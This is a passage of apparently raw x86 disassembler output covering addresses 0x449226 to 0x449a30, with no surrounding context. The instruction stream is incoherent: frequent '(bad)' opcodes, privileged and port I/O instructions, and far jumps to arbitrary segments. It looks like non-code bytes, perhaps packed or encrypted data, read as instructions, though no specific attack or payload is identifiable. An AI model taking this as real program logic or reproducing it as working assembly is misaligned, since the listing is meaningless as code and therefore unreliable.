  449226:	ss pushf 
  449228:	sbb    BYTE PTR [edx+0x5c975103],0x7f
  44922f:	stc    
  449230:	jbe    0x44921a
  449232:	mov    dh,0x1
  449234:	and    eax,0x3e16024
  449239:	int    0x47
  44923b:	outs   dx,BYTE PTR ds:[esi]
  44923c:	aas    
  44923d:	retf   0xa4bc
  449240:	imul   esp,DWORD PTR [eax],0xffffffa6
  449243:	pop    ecx
  449244:	aaa    
  449245:	add    BYTE PTR [edi-0x40],0x1
  449249:	mov    dh,0x5
  44924b:	icebp  
  44924c:	lods   al,BYTE PTR ds:[esi]
  44924d:	pop    edx
  44924e:	mov    BYTE PTR [eax-0x7b3973e6],ah
  449254:	jg     0x44920f
  449256:	fistp  QWORD PTR [ecx+esi*8-0x64]
  44925a:	sti    
  44925b:	sbb    DWORD PTR [ecx+0x3c],0x2a76abc2
  449262:	aam    0x6d
  449264:	lods   eax,DWORD PTR ds:[esi]
  449265:	scas   al,BYTE PTR es:[edi]
  449266:	mov    edx,0x85f2e3a4
  44926b:	(bad)  
  44926c:	stc    
  44926d:	int    0x87
  44926f:	les    ebx,FWORD PTR [ebx-0x30]
  449272:	mov    dh,0x8c
  449274:	mov    WORD PTR [ecx-0x3a3bf8ec],?
  44927a:	xchg   ebx,eax
  44927b:	adc    eax,0xe5128fb3
  449280:	mul    BYTE PTR [ebx+ebp*8+0x1d8c94db]
  449287:	hlt    
  449288:	retf   0x93b1
  44928b:	sub    edx,ebp
  44928d:	lds    edi,FWORD PTR [ecx+0x1bd56e54]
  449293:	ins    BYTE PTR es:[edi],dx
  449294:	jns    0x449231
  449296:	push   0xffffffcc
  449298:	xor    DWORD PTR [ebp+ebp*8-0x1c],esp
  44929c:	pop    ss
  44929d:	push   esi
  44929e:	sahf   
  44929f:	or     bl,bl
  4492a1:	sbb    ecx,ebx
  4492a3:	jne    0x4492c4
  4492a5:	pop    ecx
  4492a6:	sar    ch,1
  4492a8:	adc    al,0x25
  4492aa:	mov    edi,0x5a1fd54b
  4492af:	repnz pop ebx
  4492b1:	aad    0xad
  4492b3:	frstor [eax]
  4492b5:	sub    DWORD PTR [edx-0x7a],ecx
  4492b8:	mov    edi,0x4f0dcbb4
  4492bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4492be:	pop    ebx
  4492bf:	icebp  
  4492c0:	ffree  st(0)
  4492c2:	rcl    BYTE PTR [esp+ebx*8-0x48],1
  4492c6:	xlat   BYTE PTR ds:[ebx]
  4492c7:	mov    al,ds:0x14bebe99
  4492cc:	mov    cl,0x64
  4492ce:	sub    DWORD PTR [edi],eax
  4492d0:	mov    edi,ebx
  4492d2:	pushf  
  4492d3:	fmul   st,st(5)
  4492d5:	xor    dh,BYTE PTR [ebp+0x5af78bd4]
  4492db:	hlt    
  4492dc:	hlt    
  4492dd:	sub    eax,0x3d30d67c
  4492e2:	(bad)  
  4492e3:	hlt    
  4492e4:	div    BYTE PTR [edi-0x27605fc1]
  4492ea:	mov    WORD PTR [edi-0xbe9c4eb],gs
  4492f0:	pop    esp
  4492f1:	mov    ds:0xdddeba06,eax
  4492f6:	push   ss
  4492f7:	outs   dx,DWORD PTR ds:[esi]
  4492f8:	gs pop edi
  4492fa:	pop    ebx
  4492fb:	call   0x8e021a21
  449300:	in     eax,0xa1
  449302:	pop    ebx
  449303:	mov    ah,0xbe
  449305:	lea    eax,[edi+0x19]
  449308:	test   BYTE PTR [esi],cl
  44930a:	xor    DWORD PTR [ebx+0x2c],edx
  44930d:	push   0xffffffc1
  44930f:	push   esp
  449310:	push   0x4397ef2e
  449315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449316:	cmp    esi,DWORD PTR [ecx+0x7e5c7c80]
  44931c:	mov    ds:0xdbefa948,eax
  449321:	xor    DWORD PTR [ebp-0x8a05b9c],esi
  449327:	in     al,0x5
  449329:	mov    ds:0x3366fac8,eax
  44932e:	ja     0x4492b1
  449330:	inc    edi
  449331:	and    bh,BYTE PTR [ebx-0x2]
  449334:	sbb    al,0x39
  449336:	loop   0x449335
  449338:	sub    DWORD PTR [ecx+0x6d],esi
  44933b:	sbb    al,0xd4
  44933d:	outs   dx,DWORD PTR ds:[esi]
  44933e:	cli    
  44933f:	push   eax
  449340:	jnp    0x4492ee
  449342:	mov    ebx,0x4de104d3
  449347:	mov    al,ds:0x38be9edd
  44934c:	pop    ds
  44934d:	sub    DWORD PTR [edi-0x50],edi
  449350:	mov    bl,0x7b
  449352:	int3   
  449353:	std    
  449354:	dec    esp
  449355:	cmovle ebx,DWORD PTR fs:[edx]
  449359:	popa   
  44935a:	add    BYTE PTR [ebp+0x4e],cl
  44935d:	gs jb  0x449371
  449360:	mov    edx,0x98cf5df0
  449365:	mov    ds:0x7df41685,eax
  44936a:	sub    bl,BYTE PTR [ebp-0x7f]
  44936d:	jae    0x449324
  44936f:	ins    BYTE PTR es:[edi],dx
  449370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449371:	cmp    DWORD PTR [edx+0x418eebf2],ecx
  449377:	in     eax,dx
  449378:	fisttp DWORD PTR [edi+eax*1-0x66]
  44937c:	mov    ebp,0x8ee9e148
  449381:	inc    edx
  449382:	bnd ret 0xf506
  449386:	pop    edi
  449387:	mov    ds:0x80b07121,al
  44938c:	push   ebp
  44938d:	fbld   TBYTE PTR es:[ebx]
  449390:	lods   eax,DWORD PTR ds:[esi]
  449391:	clc    
  449392:	mov    ch,0x74
  449394:	sbb    ebx,edx
  449396:	bound  esi,QWORD PTR [esi*4-0x340d4494]
  44939d:	rcl    cl,cl
  44939f:	mov    DWORD PTR [edi-0x16],ecx
  4493a2:	fnstenv [esi-0x89066e3]
  4493a8:	xor    al,0x12
  4493aa:	inc    ebp
  4493ab:	or     ebx,DWORD PTR [ebp-0x33]
  4493ae:	mov    ebx,DWORD PTR [edi-0x13cc6114]
  4493b4:	and    BYTE PTR [esi],ah
  4493b6:	pop    ss
  4493b7:	cld    
  4493b8:	and    BYTE PTR [ecx+0x24ad5167],bl
  4493be:	jb     0x449354
  4493c0:	add    bh,bl
  4493c2:	bound  edi,QWORD PTR [eax]
  4493c4:	inc    ebp
  4493c5:	mov    al,0xa9
  4493c7:	out    0x8c,al
  4493c9:	cld    
  4493ca:	jbe    0x4493d1
  4493cc:	cld    
  4493cd:	add    BYTE PTR [eax-0x3],0xe6
  4493d1:	add    BYTE PTR [esi-0x4506f19c],dh
  4493d7:	xchg   edx,eax
  4493d8:	push   ebp
  4493d9:	daa    
  4493da:	xor    cl,0x7a
  4493dd:	or     eax,0x5921e7f9
  4493e2:	push   esi
  4493e3:	or     ebp,DWORD PTR [ecx-0x4f379e75]
  4493e9:	jecxz  0x449464
  4493eb:	adc    BYTE PTR [esi+0x7d],al
  4493ee:	mov    esp,0x44449d23
  4493f3:	push   es
  4493f4:	add    DWORD PTR [ebp+0x391b5d3a],edi
  4493fa:	jo     0x44945f
  4493fc:	mov    bh,0x29
  4493fe:	(bad)  
  4493ff:	pushf  
  449400:	mov    ebx,0x384d8ba0
  449405:	mov    esp,0xf068711f
  44940a:	dec    esi
  44940b:	fst    DWORD PTR [edi+0x644b3b6]
  449411:	mov    eax,0x93d5e4f7
  449416:	jns    0x449402
  449418:	aad    0x9e
  44941a:	pextrw ebx,(bad),0xc5
  44941c:	sbb    BYTE PTR [ecx+0x4f],bl
  44941f:	jmp    0xa031ae64
  449424:	sbb    al,0xae
  449426:	dec    ebx
  449427:	mov    esi,0xfa9d74c8
  44942c:	jmp    0x449416
  44942e:	cwde   
  44942f:	ss pop ss
  449431:	leave  
  449432:	push   eax
  449433:	lock mov edi,eax
  449436:	aad    0xab
  449438:	mov    ds:0x92fb8ba6,eax
  44943d:	loop   0x449437
  44943f:	shl    BYTE PTR [eax+0x2c9f7f31],1
  449445:	and    al,0xbf
  449447:	test   BYTE PTR [ecx-0x26],bh
  44944a:	cmp    al,0x1d
  44944c:	out    0xe1,eax
  44944e:	xchg   ecx,eax
  44944f:	rol    DWORD PTR ds:0xe2e5d870,cl
  449455:	repz pop edx
  449457:	test   al,0xd5
  449459:	sub    DWORD PTR [edi],esp
  44945b:	adc    eax,0x33bb1417
  449460:	cwde   
  449461:	sbb    BYTE PTR [edi],0x9b
  449464:	sbb    BYTE PTR [ecx-0x2de7d2ca],ch
  44946a:	je     0x449443
  44946c:	std    
  44946d:	dec    ebx
  44946e:	pop    ebp
  44946f:	or     DWORD PTR [eax],ebx
  449471:	or     DWORD PTR [edx-0x1626fcaa],ebp
  449477:	outs   dx,DWORD PTR ds:[esi]
  449478:	add    eax,0xeff096e0
  44947d:	sti    
  44947e:	nop
  44947f:	dec    edi
  449480:	sbb    bl,BYTE PTR [ecx]
  449482:	or     al,0x21
  449484:	ds call 0x6bde95ac
  44948a:	popf   
  44948b:	jmp    0xb317:0xd083a3ad
  449492:	fsub   QWORD PTR [esi]
  449494:	adc    al,0x1a
  449496:	push   edi
  449497:	mov    eax,ds:0xc64f9f2f
  44949c:	fwait
  44949d:	mov    BYTE PTR [eax+0x25],cl
  4494a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4494a1:	mov    ebx,0x68ae7a8
  4494a6:	xchg   BYTE PTR [ecx],ah
  4494a8:	ins    DWORD PTR es:[edi],dx
  4494a9:	inc    edi
  4494aa:	retf   0x89a5
  4494ad:	mov    ch,0xea
  4494af:	nop
  4494b0:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4494b2:	push   ds
  4494b3:	or     eax,DWORD PTR [edi+0x23361c09]
  4494b9:	mov    dl,0x1e
  4494bb:	or     al,0x55
  4494bd:	xor    edi,DWORD PTR [edx+0x69413539]
  4494c3:	repnz aaa 
  4494c5:	in     eax,dx
  4494c6:	cld    
  4494c7:	sbb    BYTE PTR [ecx],bl
  4494c9:	sbb    DWORD PTR [eax+ebx*8+0x5e],esp
  4494cd:	jbe    0x449506
  4494cf:	out    0x7b,eax
  4494d1:	sar    BYTE PTR [esi+edx*4+0x6b],1
  4494d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4494d6:	pop    ebx
  4494d7:	loope  0x44951b
  4494d9:	jo     0x44948a
  4494db:	aas    
  4494dc:	push   esi
  4494dd:	ror    bl,1
  4494df:	mov    esp,0x569a83be
  4494e4:	or     ebx,esp
  4494e6:	mov    ebp,0x6ba78550
  4494eb:	mov    cl,cl
  4494ed:	ffreep st(2)
  4494ef:	sbb    eax,0x9e2bd032
  4494f4:	push   ds
  4494f5:	adc    al,0x33
  4494f7:	jbe    0x449528
  4494f9:	fwait
  4494fa:	sbb    edx,DWORD PTR [edi]
  4494fc:	test   BYTE PTR [esi+0x7f],ch
  4494ff:	mov    eax,0x6cb9eaa7
  449504:	or     edi,eax
  449506:	mov    bh,0xf4
  449508:	enter  0x945,0xe9
  44950c:	mov    ecx,0xd284202a
  449511:	and    DWORD PTR [edi-0x1a34518c],edi
  449517:	(bad)  
  449518:	outs   dx,BYTE PTR ds:[esi]
  449519:	or     al,0xb3
  44951b:	test   BYTE PTR [ebx+0x252e9381],bl
  449521:	rcl    BYTE PTR [eax],1
  449523:	cli    
  449524:	fxch   st(5)
  449526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449527:	sbb    al,BYTE PTR [ebx]
  449529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44952a:	fidivr WORD PTR [ebx+0x17]
  44952d:	jmp    0xdeab0854
  449532:	es (bad) 
  449534:	fistp  WORD PTR [ebx+ebx*8+0x27897f71]
  44953b:	or     ebx,DWORD PTR [ebp+eax*4+0x30cf9cc9]
  449542:	das    
  449543:	adc    eax,0x618b53e
  449548:	adc    eax,DWORD PTR [edx+0x3f]
  44954b:	lock cmc 
  44954d:	inc    eax
  44954e:	leave  
  44954f:	out    0x23,eax
  449551:	sbb    al,0xbd
  449553:	mov    esp,0x9b0c991a
  449558:	pop    es
  449559:	push   esp
  44955a:	lods   al,BYTE PTR ds:[esi]
  44955b:	dec    eax
  44955c:	(bad)  
  44955d:	mov    al,ds:0x4898666b
  449562:	das    
  449563:	enter  0xf778,0xe8
  449567:	push   ebp
  449568:	xor    ah,ah
  44956a:	mov    esi,0x5ce2fbe4
  44956f:	bound  esp,QWORD PTR [ebp-0x250c04c9]
  449575:	lds    dx,DWORD PTR [edx+0x1c]
  449579:	or     ecx,ebp
  44957b:	ins    BYTE PTR es:[edi],dx
  44957c:	repnz mov ah,0x8f
  44957f:	mov    dl,0xb6
  449581:	lods   eax,DWORD PTR ds:[esi]
  449582:	cmp    ecx,DWORD PTR [edx]
  449584:	push   edi
  449585:	fadd   QWORD PTR [ecx+0x49]
  449588:	shl    DWORD PTR [ecx+0x8],1
  44958b:	lods   al,BYTE PTR ds:[esi]
  44958c:	and    al,0xd9
  44958e:	addr16 pop esp
  449590:	xor    esi,DWORD PTR [ecx-0x38]
  449593:	sub    ah,BYTE PTR [ecx-0x5f]
  449596:	stos   DWORD PTR es:[edi],eax
  449597:	aam    0xb2
  449599:	inc    esi
  44959a:	sbb    DWORD PTR [ebx],edx
  44959c:	sar    BYTE PTR [ebx+edi*4],0x78
  4495a0:	fiadd  DWORD PTR ds:0xc5754b8
  4495a6:	xchg   ebx,eax
  4495a7:	sti    
  4495a8:	inc    esi
  4495a9:	out    dx,eax
  4495aa:	mov    edi,0xba926d03
  4495af:	icebp  
  4495b0:	inc    edx
  4495b1:	(bad)  
  4495b2:	sub    DWORD PTR [ebx-0x1e],0xfffffffc
  4495b6:	xor    DWORD PTR [esi],ebx
  4495b8:	mov    ch,0x10
  4495ba:	int3   
  4495bb:	out    dx,al
  4495bc:	cmc    
  4495bd:	adc    BYTE PTR [esi],cl
  4495bf:	js     0x449626
  4495c1:	cmp    edi,DWORD PTR [edi-0x18afad1b]
  4495c7:	jg     0x449616
  4495c9:	jns    0x449555
  4495cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4495cc:	verw   WORD PTR [esi]
  4495cf:	loop   0x4495c5
  4495d1:	sahf   
  4495d2:	pop    ecx
  4495d3:	repnz push bx
  4495d6:	jb     0x4495aa
  4495d8:	dec    ebp
  4495d9:	mov    edi,0x5519e4de
  4495de:	stc    
  4495df:	sub    al,0x84
  4495e1:	pusha  
  4495e2:	mov    ds:0x64dd53ee,al
  4495e7:	adc    eax,0xe93402bd
  4495ec:	push   esi
  4495ed:	test   al,0x9b
  4495ef:	pop    ebp
  4495f0:	mov    edx,DWORD PTR [edx]
  4495f2:	shl    BYTE PTR [ebp+edi*2+0xa],1
  4495f6:	mov    ecx,0x4a8177e
  4495fb:	aad    0x1c
  4495fd:	inc    ebp
  4495fe:	retf   
  4495ff:	sbb    DWORD PTR [esi-0x46],ecx
  449602:	ret    0x4536
  449605:	add    ah,0xec
  449608:	std    
  449609:	add    eax,0x2a14d50a
  44960e:	(bad)  
  44960f:	(bad)  
  449610:	adc    eax,0xf74f01a4
  449615:	xchg   edi,eax
  449616:	sbb    al,0x50
  449618:	xchg   esi,eax
  449619:	scas   al,BYTE PTR es:[edi]
  44961a:	add    al,0xd3
  44961c:	lock call 0xe2b7:0xa797a92b
  449624:	sbb    al,0xe9
  449626:	cld    
  449627:	inc    esp
  449628:	add    DWORD PTR [esi-0x2ef68b63],edi
  44962e:	sti    
  44962f:	mov    edx,0x1d2253dd
  449634:	mov    ds:0x8fb77588,al
  449639:	call   0xa905:0xd91711d1
  449640:	jp     0x44967c
  449642:	sub    al,0x13
  449644:	mul    BYTE PTR [edi+0x38fa9c9e]
  44964a:	add    eax,0x2399b3c6
  44964f:	and    eax,0x88b510aa
  449654:	inc    esi
  449655:	pop    edx
  449656:	cs sbb eax,eax
  449659:	mov    dh,0x4e
  44965b:	xchg   esp,eax
  44965c:	xchg   DWORD PTR [esi],edx
  44965e:	mov    cl,0xe0
  449660:	in     al,dx
  449661:	pushf  
  449662:	pop    ebx
  449663:	clc    
  449664:	test   eax,0x82450e76
  449669:	sahf   
  44966a:	mov    ebx,0xaee3dca6
  44966f:	jmp    0x4f7d:0x20db0568
  449676:	and    eax,0xbdec5206
  44967b:	adc    al,0xd
  44967d:	xchg   bl,dl
  44967f:	iret   
  449680:	lea    ebp,[ecx-0xe3fefc5]
  449686:	sbb    bh,BYTE PTR [edx+0xfea5fe6]
  44968c:	pop    ds
  44968d:	sbb    DWORD PTR [ecx+0x649546aa],ecx
  449693:	scas   al,BYTE PTR es:[edi]
  449694:	sahf   
  449695:	scas   al,BYTE PTR es:[edi]
  449696:	sub    ecx,DWORD PTR [edi]
  449698:	es mov esi,0xe04bebf2
  44969e:	stos   BYTE PTR es:[edi],al
  44969f:	and    eax,0x2535c991
  4496a4:	fwait
  4496a5:	fwait
  4496a6:	shl    ebx,cl
  4496a8:	rcl    ch,0xb9
  4496ab:	(bad)  
  4496ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4496ad:	adc    DWORD PTR [edi],ebx
  4496af:	xor    ecx,DWORD PTR [ecx-0x5b]
  4496b2:	add    edi,ebx
  4496b4:	jne    0x4496f6
  4496b6:	std    
  4496b7:	push   ss
  4496b8:	adc    eax,0xdec4c6ae
  4496bd:	scas   eax,DWORD PTR es:[edi]
  4496be:	adc    eax,0x7ba259b8
  4496c3:	add    DWORD PTR [esi-0x76],edi
  4496c6:	jle    0x449696
  4496c8:	fcom   QWORD PTR [ebp-0x76]
  4496cb:	(bad)  
  4496cc:	test   al,0xfa
  4496ce:	mov    edx,0x16607624
  4496d3:	mov    bh,0x3a
  4496d5:	clc    
  4496d6:	cmp    DWORD PTR [esi+0x11],esp
  4496d9:	leave  
  4496da:	mov    ah,0x54
  4496dc:	inc    ecx
  4496dd:	stos   BYTE PTR es:[edi],al
  4496de:	out    0x86,al
  4496e0:	sub    DWORD PTR [eax+ecx*8-0x2c],edi
  4496e4:	jg     0x4496b2
  4496e6:	jmp    0x1ea2:0x3f350cf8
  4496ed:	and    DWORD PTR [esi+0x2a176cde],ebp
  4496f3:	push   eax
  4496f4:	and    ch,BYTE PTR [ecx+0x73af59bd]
  4496fa:	mov    esi,DWORD PTR [edx-0x62]
  4496fd:	scas   al,BYTE PTR es:[edi]
  4496fe:	mov    DWORD PTR [ecx+0x5a],esi
  449701:	sub    DWORD PTR [edi+ecx*2+0x7e745918],edi
  449708:	mov    cl,0x7
  44970a:	adc    BYTE PTR [eax-0x46f4640c],bh
  449710:	imul   eax,ebp,0xffffffd7
  449713:	clc    
  449714:	fsub   QWORD PTR [edx]
  449716:	pop    ss
  449717:	es push ds
  449719:	sub    DWORD PTR [ecx],esp
  44971b:	sbb    al,0xac
  44971d:	cmp    edx,DWORD PTR [edi]
  44971f:	repz test eax,0x5a0b8c87
  449725:	shr    DWORD PTR [ebp-0x4a3f8c51],0x42
  44972c:	and    bh,BYTE PTR [ecx+0x66]
  44972f:	call   0x4e0f:0x7c86c629
  449736:	lahf   
  449737:	push   esp
  449738:	cmp    BYTE PTR [ecx-0x6647d5c9],bl
  44973e:	mov    eax,0xe8f1a34e
  449743:	mov    BYTE PTR [eax],bl
  449745:	jns    0x44971a
  449747:	(bad)  
  449748:	nop
  449749:	adc    al,0x18
  44974b:	push   ecx
  44974c:	add    al,0xa4
  44974e:	cmp    ebp,eax
  449750:	cmp    DWORD PTR [ebp+0x62f29779],0x23
  449757:	adc    BYTE PTR [ebp*8+0x48eb4c1],0x18
  44975f:	aad    0x7f
  449761:	das    
  449762:	popa   
  449763:	jmp    0x4497a5
  449765:	hlt    
  449766:	nop
  449767:	gs add eax,0x50e89e63
  44976d:	stos   DWORD PTR es:[edi],eax
  44976e:	fstp   TBYTE PTR [ebp*2+0x373d1bc8]
  449775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449776:	icebp  
  449777:	xor    ebx,DWORD PTR [ebx+0x3a]
  44977a:	mov    cl,bl
  44977c:	ins    BYTE PTR es:[edi],dx
  44977d:	mov    ds:0x3ef19fdb,eax
  449782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449783:	mov    bh,0x98
  449785:	adc    ebp,DWORD PTR [edi+eiz*1-0x13]
  449789:	cli    
  44978a:	mov    ebp,0x39fcdedc
  44978f:	call   0x2b4b018d
  449794:	sbb    ch,BYTE PTR ds:0x82f5fce6
  44979a:	mov    esp,0x3b9b37e5
  44979f:	cmp    DWORD PTR [ebx+0x2cc70b4e],0x263e73c8
  4497a9:	or     dh,BYTE PTR [ebx-0x795c8adc]
  4497af:	lods   al,BYTE PTR ds:[esi]
  4497b0:	push   es
  4497b1:	and    ecx,DWORD PTR [eax+ebx*1]
  4497b4:	xor    DWORD PTR [edi+0x4edb8b34],esi
  4497ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4497bb:	icebp  
  4497bc:	mov    ds:0x2f33068c,al
  4497c1:	rol    ebx,cl
  4497c3:	and    BYTE PTR [edx],cl
  4497c5:	dec    ebp
  4497c6:	mov    esp,0x4bb7f324
  4497cb:	xor    bh,bl
  4497cd:	xor    DWORD PTR [edi+0x11],edi
  4497d0:	loope  0x44976d
  4497d2:	test   eax,0x3a9be921
  4497d8:	xchg   BYTE PTR [ebx+0x17],cl
  4497db:	jecxz  0x44976a
  4497dd:	popf   
  4497de:	dec    ebx
  4497df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4497e0:	sbb    DWORD PTR [edx-0x34],0x31
  4497e4:	jecxz  0x4497ea
  4497e6:	or     DWORD PTR ds:0x54bd5c57,edi
  4497ec:	xor    DWORD PTR [ecx-0x1c42c138],esp
  4497f2:	repnz into 
  4497f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4497f5:	enter  0xf087,0xdb
  4497f9:	mov    eax,0x49179bba
  4497fe:	push   esi
  4497ff:	inc    ebx
  449800:	xchg   esp,ecx
  449802:	jo     0x4497cb
  449804:	push   ss
  449805:	xchg   dh,bl
  449807:	pop    ds
  449808:	push   ds
  449809:	lahf   
  44980a:	mov    edi,DWORD PTR [esi]
  44980c:	jle    0x4497d7
  44980e:	cmp    eax,0x61404580
  449813:	push   es
  449814:	ins    BYTE PTR es:[edi],dx
  449815:	retf   0x54e1
  449818:	repnz lock pop edx
  44981b:	mov    dl,0xe8
  44981d:	mov    esp,0xb7f5acb7
  449822:	pop    edx
  449823:	out    0x2c,al
  449825:	loop   0x449842
  449827:	(bad)  
  449828:	sbb    bl,BYTE PTR [ecx+0x45118ba0]
  44982e:	add    DWORD PTR [ebp-0x57345d77],ebx
  449834:	js     0x4498a1
  449836:	pop    ss
  449837:	and    DWORD PTR [edx+0x7c],esi
  44983a:	dec    ebx
  44983b:	jnp    0x44982d
  44983d:	push   0x69fdf856
  449842:	mov    esp,0x18bccb0e
  449847:	out    dx,al
  449848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449849:	fucomip st,st(3)
  44984b:	or     ch,BYTE PTR [ebp-0x5e2e0b24]
  449851:	sbb    eax,0x391eeab8
  449856:	ret    0x83e2
  449859:	jno    0x449885
  44985b:	cmp    BYTE PTR [edx-0x5e],bh
  44985e:	sti    
  44985f:	push   ss
  449860:	out    0xf9,eax
  449862:	fimul  WORD PTR [eax]
  449864:	lea    edx,[ecx-0x46fe21d]
  44986a:	mov    bh,0x24
  44986c:	pusha  
  44986d:	pop    ebx
  44986e:	(bad)  
  44986f:	(bad)  
  449870:	out    0xb0,al
  449872:	arpl   WORD PTR [edi-0x69],dx
  449875:	lahf   
  449876:	dec    edx
  449877:	les    ebp,FWORD PTR [esi]
  449879:	call   0x2520:0x6b920f3c
  449880:	push   ss
  449881:	jnp    0x4498a1
  449883:	dec    ebx
  449884:	aad    0x47
  449886:	aas    
  449887:	pushf  
  449888:	pop    ss
  449889:	add    DWORD PTR [ecx+0x39884576],eax
  44988f:	mov    edx,0x72b01938
  449894:	repz push ss
  449896:	dec    eax
  449897:	stos   DWORD PTR es:[edi],eax
  449898:	jae    0x4498f2
  44989a:	mov    al,0xef
  44989c:	xchg   ebp,eax
  44989d:	inc    ecx
  44989e:	xor    al,0x4
  4498a1:	repnz mov eax,ds:0x7aa92c17
  4498a7:	add    al,0xff
  4498a9:	push   esi
  4498aa:	shr    DWORD PTR [edi-0x45],0x9f
  4498ae:	cli    
  4498af:	push   cs
  4498b0:	pop    ss
  4498b1:	jmp    0x2ee8fda1
  4498b6:	mov    ebp,0x6c96c6ae
  4498bb:	les    esp,FWORD PTR [edx-0x79]
  4498be:	int    0xda
  4498c0:	cli    
  4498c1:	mov    bh,0x24
  4498c3:	aaa    
  4498c4:	stos   DWORD PTR es:[edi],eax
  4498c5:	popf   
  4498c6:	aaa    
  4498c7:	call   0x80b231e8
  4498cc:	mov    ch,BYTE PTR [eax+0x2f]
  4498cf:	or     ecx,ebp
  4498d1:	xchg   ebp,eax
  4498d2:	jg     0x449860
  4498d4:	and    BYTE PTR [ecx+0x27],ah
  4498d7:	dec    ebx
  4498d8:	xor    esi,esp
  4498da:	sub    esp,0x1f
  4498dd:	mov    DWORD PTR [eax-0x2631a879],eax
  4498e3:	out    dx,eax
  4498e4:	add    DWORD PTR [edx-0x6c05c665],ebx
  4498ea:	and    DWORD PTR [esi+0x26e8529],esi
  4498f0:	call   0x55512171
  4498f5:	in     eax,dx
  4498f6:	repz out dx,al
  4498f8:	jecxz  0x4498a1
  4498fa:	cmp    BYTE PTR [eax+0x5],0x5c
  4498fe:	jecxz  0x4498ec
  449900:	sub    bh,dl
  449902:	rol    BYTE PTR [edi+0x1e],0xa9
  449906:	jmp    0x44995b
  449908:	(bad)  
  449909:	xor    eax,0x9ae8373d
  44990e:	retf   
  44990f:	xor    BYTE PTR [ebx-0x67],bl
  449912:	jo     0x44993f
  449914:	lock outs dx,DWORD PTR ds:[esi]
  449916:	not    DWORD PTR [ebx-0x5b33c9b3]
  44991c:	inc    ebx
  44991d:	mov    ch,0xa0
  44991f:	js     0x4498ad
  449921:	pushf  
  449922:	cmp    esi,DWORD PTR [edx+0x53280933]
  449928:	sub    bh,BYTE PTR es:[edx]
  44992b:	rcr    DWORD PTR [edx+eiz*4+0x26dc9417],1
  449932:	mov    edx,0xe430a75e
  449937:	test   BYTE PTR [ebp+0x1e],ch
  44993a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  44993d:	and    BYTE PTR ds:0x510335b7,dh
  449943:	jmp    0x4498f5
  449945:	cmp    esi,DWORD PTR [ecx+0x61]
  449948:	mov    eax,?
  44994a:	mov    dh,0x3e
  44994c:	dec    edi
  44994d:	test   eax,0xf53d85a9
  449952:	lock call 0x2d00385d
  449958:	mov    DWORD PTR [ebx-0x4],ecx
  44995b:	in     eax,dx
  44995c:	shr    BYTE PTR [edx],0x41
  44995f:	pop    ecx
  449960:	mov    dh,0x16
  449962:	mov    ecx,0xa7993134
  449967:	test   DWORD PTR [ebp+0x5fe8c51d],edx
  44996d:	cmc    
  44996e:	test   BYTE PTR [ebx],al
  449970:	sbb    DWORD PTR [ecx-0x3622c95f],ebp
  449976:	lods   eax,DWORD PTR ds:[esi]
  449977:	inc    ebx
  449978:	enter  0xcba2,0x9b
  44997c:	fwait
  44997d:	retf   0x94c4
  449980:	stc    
  449981:	sbb    eax,0xa51c63f7
  449986:	jnp    0x4499d0
  449988:	lea    eax,[ebp+0x69ef6c73]
  44998e:	xor    edx,DWORD PTR [edi-0x5dcd48ca]
  449994:	pop    ds
  449995:	rcl    esi,0xd9
  449998:	dec    edx
  449999:	mov    ah,0xf
  44999b:	sbb    ah,BYTE PTR [eax+ebx*1]
  44999e:	mov    al,0x44
  4499a0:	xchg   ebp,eax
  4499a1:	ret    0x2978
  4499a4:	xchg   esi,eax
  4499a5:	xchg   ecx,ecx
  4499a7:	or     eax,DWORD PTR ds:0x74ce088
  4499ad:	pusha  
  4499ae:	leave  
  4499af:	shl    BYTE PTR ds:0x779afd9,cl
  4499b5:	gs leave 
  4499b7:	call   0x6729:0x7c2bab29
  4499be:	pop    es
  4499bf:	in     al,dx
  4499c0:	sbb    DWORD PTR [ecx+0x50135e8a],esi
  4499c6:	shr    BYTE PTR [ecx+0x25],cl
  4499c9:	dec    ecx
  4499ca:	mov    bl,0xb
  4499cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4499cd:	inc    edi
  4499ce:	push   cs
  4499cf:	pop    edx
  4499d0:	xchg   esi,eax
  4499d1:	fwait
  4499d2:	mov    eax,DWORD PTR [ebp+0x71b83259]
  4499d8:	mov    ah,0xb7
  4499da:	jg     0x4499d4
  4499dc:	out    0x3c,eax
  4499de:	mov    eax,0x9f0acec4
  4499e3:	out    dx,al
  4499e4:	cmc    
  4499e5:	mov    cx,si
  4499e8:	lock mov ds:0xc92ec92f,al
  4499ee:	retf   0x57c3
  4499f1:	out    0x36,al
  4499f3:	aad    0x9b
  4499f5:	cmp    BYTE PTR [eax+0x1c513522],cl
  4499fb:	out    dx,eax
  4499fc:	mov    edi,gs
  4499fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4499ff:	or     al,BYTE PTR [esi-0x17]
  449a02:	jle    0x449a29
  449a04:	pop    eax
  449a05:	push   cs
  449a06:	push   ax
  449a08:	repz xor BYTE PTR [ebp-0x44ad8a8f],0xe7
  449a10:	sub    al,0x3e
  449a12:	ret    0x22fd
  449a15:	xchg   DWORD PTR [ebp+0x15],ecx
  449a18:	pop    edx
  449a19:	pop    eax
  449a1a:	mov    dh,0x44
  449a1c:	jmp    0x5ff2482
  449a21:	lock icebp 
  449a23:	jmp    0xd115:0xab6ab6f6
  449a2a:	pop    esi
  449a2b:	dec    eax
  449a2c:	cmp    DWORD PTR [eax],edi
  449a2e:	mov    bh,0xd4
  449a30:	push   es
